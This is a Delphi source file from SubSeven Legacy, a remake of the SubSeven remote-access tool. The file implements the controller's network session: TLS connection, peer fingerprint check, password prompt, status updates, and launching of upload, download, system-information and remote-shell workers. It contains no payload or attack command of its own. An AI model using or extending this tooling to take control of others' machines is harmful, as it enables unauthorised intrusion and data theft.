{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit Sub7.Thread.Net.Client.Session;


interface

uses System.Classes, Sub7.Thread.Net.Client.NonBlockingCmd, Winapi.Winsock2,
     Generics.Collections, Sub7.Net.Client.Context, Sub7.Core.Protocol, XSuperObject,
     VirtualTrees, Sub7.Core.Thread, System.SysUtils, Sub7.Thread.Net.Client.Base,
     Sub7.Core.Types;

type
  TSub7ClientSession = class(TSub7NonBlockingCmd)
  private
    FFingerprint : String;

    {@M}
    procedure SetStatus(const AStatus : String);
  protected
   {@M}
    procedure OnBeforeCommandLoop(); override;
    procedure OnCommand(const ACommand : TS7Command; AData : ISuperObject = nil); override;
    procedure OnAfterCommandLoop(); override;
    procedure OnConnected(const ASocket : TSocket); override;
    procedure OnInitiateTLSConnection(); override;
    procedure OnTLSConnected(); override;
    procedure OnConnect(); override;
    procedure OnSessionCreated(const AMachineName : String); override;
    procedure OnPasswordRequest(var APassword : String; var ACanceled : Boolean); override;
    procedure OnIdle(); override;
    procedure OnExitThread(); override;
    procedure OnThreadExecute(); override;
    procedure OnDisconnected(); override;
    procedure ExceptionHandler(const E : Exception); override;
    procedure OnVerifyPeer(const AFingerprint : String; var ASuccess : Boolean); override;
  public
    {@M}
    procedure CreateSessionWorker(const AWorkerKind : TWorkerKind; const ANode : PVirtualNode = nil);

    constructor Create(const AContext : TSub7ClientContext); override;
  end;

implementation

uses Winapi.Windows, Sub7.Core.Exceptions, Sub7.Core.Bundle, uFormMain,
     Sub7.OpenSSL.TLS.Exceptions, uFormExceptions, Sub7.Core.Thread.Watcher,
     Sub7.OpenSSL.TLS.Utils,

     Sub7.Thread.Net.Client.SystemInformationHook,
     Sub7.Thread.Net.Client.RemoteShell,
     Sub7.Thread.Net.Client.Transfer.Upload,
     Sub7.Thread.Net.Client.Transfer.Download;

{ TSub7ClientSession.Create }

constructor TSub7ClientSession.Create(const AContext : TSub7ClientContext);
begin
  inherited Create(AContext);
  ///

  FFingerprint := '';
end;

{ TSub7ClientSession.OnVerifyPeer

  Verify if peer fingerprint is known in our local database }

procedure TSub7ClientSession.OnVerifyPeer(const AFingerprint : String; var ASuccess : Boolean);
var _Success : Boolean;
begin
  SafeSynchronize(procedure begin
    FormMain.OnVerifyPeer(AFingerprint, _Success);
  end);

  if _Success then
    FFingerprint := AFingerprint;

  ///
  ASuccess := _Success;
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSession.ExceptionHandler(const E : Exception);
var AMessage : String;
begin
  inherited;
  ///

  if ((E is ETLSSocketException) or (E is EOpenSSLBaseException)) and (FContext.SessionId <> '') then
    AMessage := 'Disconnected from peer.'
  else
    AMessage := E.Message;

  ///
  self.SetStatus(AMessage);
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnPasswordRequest(var APassword : String; var ACanceled : Boolean);
var AInputPassword : String;
    AInputCanceled : Boolean;
begin
  self.SetStatus('Server has requested authentication.');
  ///

  SafeSynchronize(procedure begin
    FormMain.OnRequestPassword(self, AInputPassword, AInputCanceled);
  end);

  ///
  APassword := AInputPassword;
  ACanceled := AInputCanceled;
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnIdle();
begin
  inherited OnIdle();
  ///

end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnSessionCreated(const AMachineName : String);
begin
  SafeSynchronize(procedure begin
    FormMain.UpdateSessionStatus(sessConnected);

    FormMain.RegisterServerInformation(AMachineName, FFingerprint);
  end);

  ///
  self.SetStatus('Session successfully established with remote host.');
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnInitiateTLSConnection();
begin
  inherited;
  ///

  self.SetStatus('Initiate TLS connection...');
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnTLSConnected();
begin
  inherited;
  ///

  self.SetStatus('TLS connection initiated.');
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnConnect();
begin
  inherited;
  ///

  self.SetStatus('Connect to remote host...');
end;

{-------------------------------------------------------------------------------
  On Disconnected
-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnDisconnected();
begin
  inherited OnDisconnected();
  ///

end;

{-------------------------------------------------------------------------------
  On Connect Event
-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnConnected(const ASocket : TSocket);
begin
  inherited;
  ///

  self.SetStatus('Connected.');
end;

{-------------------------------------------------------------------------------
  Set Form Main Status
-------------------------------------------------------------------------------}
procedure TSub7ClientSession.SetStatus(const AStatus : String);
begin
  SafeSynchronize(procedure begin
    FormMain.SetStatus(AStatus);
  end);
end;

{-------------------------------------------------------------------------------
  Create a new session worker
-------------------------------------------------------------------------------}
procedure TSub7ClientSession.CreateSessionWorker(const AWorkerKind : TWorkerKind; const ANode : PVirtualNode = nil);
var AWorker : TCoreThread;
begin
  AWorker := nil;
  ///

  case AWorkerKind of
    wkRemoteDesktopHandler : ;
    wkUploadHandler        : AWorker := TThreadTransferUpload.Create(FContext, ANode, ukFileManager);
    wkDownloadHandler      : AWorker := TThreadTransferDownload.Create(FContext, ANode);
    wkSessionListener      : AWorker := TSub7SystemInformationHook.Create(FContext);
    wkTerminal             : AWorker := TSub7ClientRemoteShell.Create(FContext);
  end;

  if Assigned(AWorker) then
    GLOBAL_THREAD_WATCHER.Add(AWorker, self);
end;

{-------------------------------------------------------------------------------

-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnThreadExecute();
begin
  SafeSynchronize(procedure begin
    FormMain.UpdateSessionStatus(sessInit);
  end);

  ///
  inherited OnThreadExecute();
end;

{-------------------------------------------------------------------------------
  Before Command Loop
-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnBeforeCommandLoop();
begin
  ///
end;

{-------------------------------------------------------------------------------
  On Receive Commands
-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnCommand(const ACommand : TS7Command; AData : ISuperObject = nil);
begin
  ///
end;

{-------------------------------------------------------------------------------
  After Command Loop
-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnAfterCommandLoop();
begin
  GLOBAL_THREAD_WATCHER.Terminate(self);
end;

{-------------------------------------------------------------------------------
  Thread Exit
-------------------------------------------------------------------------------}
procedure TSub7ClientSession.OnExitThread();
begin
  SafeSynchronize(procedure begin
    FormMain.UpdateSessionStatus(sessDisconnected);
  end);

  ///
  inherited OnExitThread();
end;

end.

